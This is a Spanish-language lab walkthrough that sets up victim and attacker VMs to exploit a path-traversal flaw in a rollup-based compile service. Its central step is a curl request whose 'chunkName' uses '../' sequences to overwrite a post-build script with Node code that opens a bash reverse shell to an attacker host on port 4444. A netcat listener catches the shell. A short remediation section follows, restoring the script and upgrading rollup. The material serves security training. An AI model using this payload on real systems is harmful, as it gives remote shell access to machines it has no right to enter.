# Setup

## Preparar vm víctima

### Obtener IP
```bash
hostname -I
```

### Dependencias
```bash
sudo apt update
sudo apt install -y nodejs npm netcat-openbsd nano
```

### script legítimo del servicio interno
```bash
sudo mkdir -p /opt/servicio
sudo bash -c 'echo "console.log(\"post-build ejecutado correctamente.\");" > /opt/servicio/post-build.js'
sudo chmod 666 /opt/servicio/post-build.js
```

### Preparar entorno con `rollup` con versión vulnerada
```bash
mkdir -p ~/rollup-lab/src
cd ~/rollup-lab
npm init -y
npm install rollup@4.58.0
echo 'console.log("Hola mundo - index.js");' > src/index.js
```

### Iniciar servicio
```bash
node server.js
```

## Preparar vm atacante
### Obtener IP
```bash
hostname -I
```

### Instalar herramientas
```bash
sudo apt update
sudo apt install -y curl netcat-openbsd
```

### Abrir listener para reverse shell
```bash
nc -lvnp 4444
```

## Ejecución del ataque
```bash
# en una terminal secundaria
curl -X POST http://<IP_VICTIMA>:3000/compile \
     -H "Content-Type: application/json" \
     -d '{
       "chunkName": "sub/../../../../../opt/servicio/post-build",
       "code": "const { exec } = require(\"child_process\"); exec(\"bash -c '\''bash -i >& /dev/tcp/<IP_ATACANTE>/4444 0>&1'\''\");"
     }'
```

### Verificación
```bash
whoami
hostname -I
cat /opt/servicio/post-build.js
```

# Remediación
## 1. Detener servidor y restaurar script original
```bash
echo 'console.log("post-build ejecutado correctamente.");' > /opt/servicio/post-build.js
```

## 2. Actualizar rollup a versión sin la vulnerabilidad
```bash
npm install rollup@4.59.0
```

## 3. Volver a iniciar el servidor

## 4. Repetir ataque para verificación
